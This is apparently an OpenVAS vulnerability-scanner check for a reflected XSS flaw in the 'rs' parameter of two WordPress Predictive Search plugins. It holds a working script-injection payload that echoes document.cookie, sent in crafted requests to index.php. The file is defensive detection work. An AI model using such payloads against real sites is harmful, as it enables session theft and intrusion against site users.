###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_predictive_search_plugins_xss_vuln.nasl 5956 2017-04-14 09:02:12Z teissa $
#
# WordPress WP e-Commerce And WooCommerce Predictive Search Plugin 'rs' XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_solution = "Upgrade to the WordPress WooCommerce Predictive Search Plugin version 1.0.6 or later,
  For updates refer to http://wordpress.org/extend/plugins/woocommerce-predictive-search/

  Upgrade to the WordPress WP e-Commerce Predictive Search Plugin version 1.1.2 or later,
  For updates refer to http://wordpress.org/extend/plugins/wp-e-commerce-predictive-search/";

tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed.
  Impact Level: Application";
tag_affected = "WordPress WooCommerce Predictive Search Plugin version 1.0.5 and prior
  WordPress WP e-Commerce Predictive Search plugin version 1.1.1 and prior";
tag_insight = "Input passed via the 'rs' parameter to index.php
  (when page_id is set to the predictive search page) is not properly
  sanitised before it is returned to the user.";
tag_summary = "This host is running WordPress WP e-Commerce or WooCommerce Predictive
  Search Plugins and is prone to cross site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803072";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5956 $");
  script_bugtraq_id(56702, 56703);
  script_tag(name:"last_modification", value:"$Date: 2017-04-14 11:02:12 +0200 (Fri, 14 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-12-10 13:35:37 +0530 (Mon, 10 Dec 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress WP e-Commerce And WooCommerce Predictive Search Plugin 'rs' XSS Vulnerability");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/51385");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51384/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80382");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80383");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/51384");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/51385");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "solution" , value : tag_solution);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";
pageid = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## page_id for WP e-Commerce is 4 and WooCommerce is 5
foreach pageid (make_list("4", "5"))
{
  ## Construct XSS attack request
  url = dir + '/?page_id=' + pageid + '&rs=><script>alert(document.cookie)</script>';

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                     pattern:"<script>alert\(document.cookie\)</script>",
                     extra_check:"Predictive Search"))
  {
    security_message(port:port);
    exit(0);
  }
}
